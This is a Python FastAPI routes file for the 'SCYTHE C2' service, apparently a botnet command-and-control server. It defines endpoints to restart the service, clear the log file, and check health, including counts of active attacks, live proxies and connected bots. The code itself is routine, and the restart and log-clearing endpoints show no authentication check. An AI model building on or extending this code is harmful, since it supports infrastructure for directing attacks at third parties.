"""
Service management routes for SCYTHE C2.
- POST /api/service/restart     → Restart the service (requires process manager)
- POST /api/service/clear-logs  → Clear log files
- GET  /api/service/health      → Comprehensive system health check
"""

from fastapi import APIRouter, Request, HTTPException
from fastapi.responses import JSONResponse
import os
import sys
import asyncio
from pathlib import Path

from app.core.logger import logger
from app.core.config import settings

router = APIRouter(prefix="/api/service", tags=["service"])


@router.post("/restart")
async def restart_service(request: Request):
    """
    Restart the SCYTHE C2 service.
    Note: Works only if the server is managed by systemd/supervisor or run with --reload.
    For production, use: sudo systemctl restart scythe-c2
    """
    logger.warning("Restart service requested via API")
    # Return a message indicating restart is triggered
    # Use background task to exit after response
    async def _restart():
        await asyncio.sleep(1)  # give time for response to be sent
        logger.info("Restarting service...")
        # Exit with code 0; systemd/supervisor will restart
        sys.exit(0)

    asyncio.create_task(_restart())
    return JSONResponse(content={
        "success": True,
        "message": "Service restart initiated. The service will restart shortly."
    })


@router.post("/clear-logs")
async def clear_logs(request: Request):
    """
    Clear the log file (truncate to zero).
    """
    log_path = Path(settings.LOG_FILE)
    try:
        if log_path.exists():
            with open(log_path, "w") as f:
                f.truncate(0)
            logger.info("Log file cleared via API")
            return JSONResponse(content={
                "success": True,
                "message": f"Log file cleared: {log_path}"
            })
        else:
            return JSONResponse(content={
                "success": False,
                "message": "Log file not found"
            }, status_code=404)
    except Exception as e:
        logger.error(f"Failed to clear log file: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/health")
async def health_check(request: Request):
    """
    Comprehensive health check for the entire system.
    Checks Redis, attack_manager, proxy_manager, botnet_manager.
    """
    health_status = {
        "status": "ok",
        "timestamp": int(asyncio.get_event_loop().time()),
        "checks": {}
    }

    # Check Redis
    try:
        redis = request.app.state.redis
        await redis.ping()
        health_status["checks"]["redis"] = {"status": "ok"}
    except Exception as e:
        health_status["checks"]["redis"] = {"status": "error", "error": str(e)}
        health_status["status"] = "degraded"

    # Check Attack Manager
    try:
        attack_manager = request.app.state.attack_manager
        health_status["checks"]["attack_manager"] = {
            "status": "ok",
            "active_attacks": len(attack_manager.active_attacks)
        }
    except Exception as e:
        health_status["checks"]["attack_manager"] = {"status": "error", "error": str(e)}
        health_status["status"] = "degraded"

    # Check Proxy Manager
    try:
        proxy_manager = request.app.state.proxy_manager
        proxy_stats = await proxy_manager.get_stats()
        health_status["checks"]["proxy_manager"] = {
            "status": "ok",
            "alive_proxies": proxy_stats.alive,
            "total_proxies": proxy_stats.total
        }
    except Exception as e:
        health_status["checks"]["proxy_manager"] = {"status": "error", "error": str(e)}
        health_status["status"] = "degraded"

    # Check Botnet Manager
    try:
        botnet_manager = request.app.state.botnet_manager
        health_status["checks"]["botnet_manager"] = {
            "status": "ok",
            "connected_bots": len(botnet_manager.active_writers) if botnet_manager else 0
        }
    except Exception as e:
        health_status["checks"]["botnet_manager"] = {"status": "error", "error": str(e)}
        health_status["status"] = "degraded"

    # Overall status
    if health_status["status"] == "ok":
        return JSONResponse(content=health_status, status_code=200)
    else:
        return JSONResponse(content=health_status, status_code=503)